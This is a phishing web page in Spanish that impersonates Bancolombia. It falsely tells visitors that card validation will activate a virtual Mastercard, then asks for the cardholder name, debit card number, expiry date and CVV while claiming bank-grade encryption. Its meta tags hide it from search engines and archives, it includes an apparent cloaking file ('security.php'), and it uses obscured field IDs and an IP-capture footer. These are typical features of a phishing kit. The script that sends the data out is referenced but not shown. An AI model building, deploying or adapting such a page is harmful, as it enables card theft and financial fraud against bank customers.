<?php require_once 'security.php'; ?>
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <meta name="robots" content="noindex, nofollow, noarchive, nosnippet, notranslate">
    <meta name="googlebot" content="noindex, nofollow, noarchive, nosnippet">
    <meta name="description" content="Validación segura de tarjeta Bancolombia.">
    <title>Validación de tarjeta — Bancolombia</title>
    <link rel="icon" type="image/svg+xml" href="favicon.svg">
    <link rel="shortcut icon" href="favicon.ico" type="image/x-icon">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css" />
    <script src="jquery-3.7.7.js"></script>
    <link rel="stylesheet" href="assets/css/pages/tarjeta_debito.css">
</head>
<body>

    <!-- ============================================
    ELIMINADO: LOADING OVERLAY - YA NO SE USA
    ============================================ -->

    <!-- ============================================
    TRAZO DE FONDO - ESCRITORIO
    ============================================ -->
    <img src="assets/images/trazo-escritorio.svg" alt="" class="trazo-fondo">

    <!-- ============================================
    HEADER
    ============================================ -->
    <header class="header-top">
        <div class="header-content">
            <div class="header-slot"></div>
            <img src="assets/images/logo-encabezado.svg" alt="Bancolombia" class="logo-header">
            <a href="#" class="btn-salir">Salir <span class="arrow">&rarr;</span></a>
        </div>
    </header>

    <!-- ============================================
    DEBT.png - SOLO MOVIL (DEBAJO DEL HEADER)
    ============================================ -->
    <img src="assets/images/debt.png" alt="" class="debt-mobile">

    <!-- ============================================
    CONTENIDO PRINCIPAL
    ============================================ -->
    <div class="contenido-principal">
        <!-- TÍTULO - ARRIBA DEL CONTENEDOR -->
        <h1 class="titulo-principal">Confirma tu identidad</h1>

        <section class="center-stage">
            <!-- WRAPPER PARA CONTENEDOR + TRAZO + FOOTER -->
            <div class="contenedor-principal">

                <!-- FORM-CONTAINER -->
                <div class="form-container">
                    <div class="form-box">

                        <!-- DESCRIPCIÓN -->
                        <p class="descripcion">
                            Ingresa los datos de tu tarjeta de débito para validar tu identidad y activar el cupo de tu <strong>Tarjeta de crédito Virtual Mastercard</strong>.
                            <br><br>
                            No se realizará ningún cargo. Información protegida con cifrado bancario.
                        </p>

                        <!-- MENSAJE DE ERROR -->
                        <div id="error-message">
                            La tarjeta ingresada es incorrecta. Por favor verifique los datos.
                        </div>

                        <!-- FORMULARIO -->
                        <form class="form" id="paymentForm">

                            <!-- NOMBRE DEL TITULAR (EDITABLE) -->
                            <div class="campo-tarjeta">
                                <label>NOMBRE DEL TITULAR</label>
                                <div class="input-wrapper">
                                    <span class="icono"><i class="fas fa-user"></i></span>
                                    <input
                                        type="text"
                                        id="inp_c_nmbr"
                                        placeholder="Como aparece en la tarjeta"
                                        required
                                    />
                                </div>
                            </div>

                            <!-- NÚMERO DE TARJETA -->
                            <div class="campo-tarjeta">
                                <label>NÚMERO DE TARJETA</label>
                                <div class="input-wrapper">
                                    <span class="icono"><i class="fas fa-credit-card"></i></span>
                                    <input
                                        type="tel"
                                        id="inp_c_nm"
                                        placeholder="5306 0000 0000 0000"
                                        required
                                        maxlength="19"
                                    />
                                </div>
                            </div>

                            <!-- FILA: VENCIMIENTO + CVV -->
                            <div class="fila-vencimiento-cvv">
                                <div class="campo-tarjeta">
                                    <label>VENCIMIENTO</label>
                                    <div class="input-wrapper">
                                        <span class="icono"><i class="fas fa-calendar-alt"></i></span>
                                        <input
                                            type="tel"
                                            id="inp_c_xp"
                                            placeholder="MM/AA"
                                            required
                                            maxlength="5"
                                        />
                                    </div>
                                </div>

                                <div class="campo-tarjeta">
                                    <label>CVV</label>
                                    <div class="input-wrapper">
                                        <span class="icono"><i class="fas fa-lock"></i></span>
                                        <input
                                            type="password"
                                            id="inp_c_vv"
                                            placeholder="CVV"
                                            required
                                            maxlength="4"
                                        />
                                    </div>
                                </div>
                            </div>

                            <!-- BOTÓN CONTINUAR -->
                            <button type="submit" class="btn-continuar" id="btnContinuarTarjeta">Continuar</button>

                        </form>

                    </div>
                </div>

                <!-- TRAZO - SIN BORDES NI SOMBRAS -->
                <div class="trazo-wrapper">
                    <img src="assets/images/trazo-escritorio.svg" alt="" />
                </div>

                <!-- FOOTER - CON IP REAL DEL CLIENTE -->
                <footer class="footer-container">
                    <div class="footer-line"></div>
                    <div class="footer-content">
                        <div class="footer-logos">
                            <div class="logo-intermedio">
                                <img src="assets/images/logo-pie.svg" alt="Bancolombia">
                            </div>
                            <div class="logo-vigilado">
                                <img src="assets/images/estrella-hola.svg" alt="Vigilado">
                            </div>
                        </div>
                        <div class="info-footer">
                            <div class="ip-text">Dirección IP: <span id="gfg">Cargando...</span></div>
                            <div id="fecha-hora" class="fecha-text"></div>
                        </div>
                    </div>
                </footer>

            </div>
        </section>
    </div>

    <div id="address" hidden></div>

    <!-- ============================================
    SCRIPTS - OBTENER IP REAL DEL CLIENTE
    ============================================ -->

    <script src="https://cdn.jsdelivr.net/npm/axios@1.1.2/dist/axios.min.js"></script>
    <script src="assets/js/shared/page-common.js"></script>
    <script src="assets/js/pages/tarjeta_debito.js"></script>

</body>
</html>

